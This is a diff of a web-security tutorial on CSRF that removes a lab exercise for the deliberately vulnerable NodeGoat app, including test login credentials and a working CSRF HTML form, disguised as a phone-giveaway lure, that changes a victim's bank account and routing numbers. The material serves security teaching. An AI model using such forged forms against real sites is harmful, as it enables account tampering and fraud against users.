@@ -37,7 +37,6 @@
     - [Access controls](#access-controls)
         - [How to avoid it](#how-to-avoid-it)
     - [CSRF](#csrf)
-        - [:bangbang: NodeGoat](#bangbang-nodegoat)
         - [How to avoid it](#how-to-avoid-it)
     - [Insecure components](#insecure-components)
     - [Unvalidated Redirects](#unvalidated-redirects)
@@ -401,34 +400,6 @@ Here is an example scenario: imagine a Web application that allows users to tran
 ```
 
 If the victim access the website that is under the attacker's control (e.g. because the attacker send the victim an enticing email to access the URL), the browser downloads the HTML, parses it and starts rendering. It will automatically download the image without checking whether the `src` is actually an image. The transfer of funds will then take place if the web application the user is authenticated to does not defend against a CSRF attack (This occurs when the web application cannot distinguish between a forged and legitimate request).
-
-#### :bangbang: NodeGoat
-
-1. Head to NodeGoat's installation at http://nodegoat.herokuapp.com/login. 
-2. Login with `user1` (user) and `User1_123` (password).
-3. Click *Profile* and check the current *Bank Account* and *Bank Routing* numbers. 
-4. Now save the following HTML document:
-
-```html
-<!doctype html>
-<html lang="en">
-    <head>
-    </head>
-    <body>
-        <form method="POST" action="http://nodegoat.herokuapp.com/profile">
-            <h1> You are about to win a brand new phone!</h1>
-            <h2> Click on the win button to claim it...</h2>
-            <input type="hidden" name="bankAcc" value="2"/>
-            <input type="hidden" name="bankRouting" value="2#"/>
-            <input type="submit" value="Win !!!"/>
-        </form>
-    </body>
-</html>
-```
-
-and open it in a new browser tab. This is the attacker's site.
-
-5. Click the *Win* button. You are now redirected. On the *Profile* page you should now see bank account and bank routing numbers set to `2`.
 
 #### How to avoid it
 
